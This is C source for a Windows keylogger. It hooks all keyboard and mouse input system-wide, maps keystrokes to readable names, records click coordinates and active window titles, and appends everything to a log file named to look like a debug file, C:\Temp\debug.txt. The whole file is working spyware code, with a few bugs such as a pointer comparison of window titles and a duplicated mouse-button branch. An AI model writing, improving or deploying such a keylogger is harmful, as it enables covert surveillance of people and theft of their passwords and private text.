#include <stdio.h>
#include <ctype.h>
#include <conio.h>
#include <Windows.h>
#include <Winuser.h>

FILE *fp;
char last_window[256];
int writingText = 0;

void KeyboardVkCode(int vkCode, char *buf){
    printf("%d\n", vkCode);
    if(vkCode == 13){
        strcpy(buf , "Enter");
    } else if(vkCode == 160 || vkCode == 161){
        strcpy(buf , "Shift");
    } else if(vkCode == 162 || vkCode == 163){
        strcpy(buf , "Ctrl");
    } else if(vkCode == 164 || vkCode == 165){
        strcpy(buf , "Alt");
    } else if(vkCode == 91 || vkCode == 92){
        strcpy(buf , "Windows");
    } else if(vkCode == 20){
        strcpy(buf , "CapsLock");
    } else if(vkCode == 144){
        strcpy(buf , "NumLock");
    } else if(vkCode == 145){
        strcpy(buf , "ScrollLock");
    } else if(vkCode == 32){
        strcpy(buf , " ");
    } else if(vkCode == 8){
        strcpy(buf , "Backspace");
    } else if(vkCode == 46){
        strcpy(buf , "Delete");
    } else if(vkCode == 9){
        strcpy(buf , "Tab");
    } else if(vkCode == 37){
        strcpy(buf , "LeftArrow");
    } else if(vkCode == 38){
        strcpy(buf , "UpArrow");
    } else if(vkCode == 39){
        strcpy(buf , "RightArrow");
    } else if(vkCode == 40){
        strcpy(buf , "DownArrow");
    } else if(vkCode == 112){
        strcpy(buf , "F1");
    } else if(vkCode == 113){
        strcpy(buf , "F2");
    } else if(vkCode == 114){
        strcpy(buf , "F3");
    } else if(vkCode == 115){
        strcpy(buf , "F4");
    } else if(vkCode == 116){
        strcpy(buf , "F5");
    } else if(vkCode == 117){
        strcpy(buf , "F6");
    } else if(vkCode == 118){
        strcpy(buf , "F7");
    } else if(vkCode == 119){
        strcpy(buf , "F8");
    } else if(vkCode == 120){
        strcpy(buf , "F9");
    } else if(vkCode == 121){
        strcpy(buf , "F10");
    } else if(vkCode == 122){
        strcpy(buf , "F11");
    } else if(vkCode == 123){
        strcpy(buf , "F12");
    } else if(vkCode == 44){
        strcpy(buf , "PrintScreen");
    } else if(vkCode == 27){
        strcpy(buf , "Escape");
    } else{
        buf[0] = MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
        buf[1] = '\0';
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
    if (nCode == HC_ACTION){
        if(wParam == WM_KEYUP){
            char arr[50] = {0};
            KeyboardVkCode(p->vkCode, arr);
            fp = fopen("C:\\Temp\\debug.txt", "a");
            fprintf(fp, "(%s) %d\n", arr, p->vkCode);
            fclose(fp);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam){
    PMSLLHOOKSTRUCT p = (PMSLLHOOKSTRUCT) lParam;
    if (nCode == HC_ACTION){
        fp = fopen("C:\\Temp\\debug.txt", "a");
        if(wParam == WM_LBUTTONDOWN){
            fprintf(fp, "(LMouseButton) %d, %d\n", p->pt.x, p->pt.y);
            HWND foreground = GetForegroundWindow();
            if(foreground){
                char window_title[256];
                GetWindowText(foreground, window_title, 256);
                if(window_title != last_window){
                    strcpy(last_window, window_title);
                    fprintf(fp, "(Active Window:) %s\n", window_title);
                }
            }
        } else if(wParam == WM_RBUTTONDOWN){
            fprintf(fp, "(RMouseButton) %d, %d\n", p->pt.x, p->pt.y);
        } else if(wParam == WM_LBUTTONDOWN){
            fprintf(fp, "(MouseWheelPressed) %d, %d\n", p->pt.x, p->pt.y);
        } else if(wParam == WM_MOUSEWHEEL){
            int mousewheel = p->mouseData;
            if(mousewheel >= 1) printf("(MouseWheelForward) %d\n", p->mouseData);
            else if(mousewheel <= -1) printf("(MouseWheelBackward) %d\n", p->mouseData);
        }
        fclose(fp);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hinstExe, HINSTANCE a, PTSTR pszCmdLine, int b){
    HHOOK hhkLowLevelKybd  = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    HHOOK hhkLowLevelMous  = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, 0);
    int i = 0;
    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0) != 0);
    UnhookWindowsHookEx(hhkLowLevelKybd);
    UnhookWindowsHookEx(hhkLowLevelMous);
    return(0);
}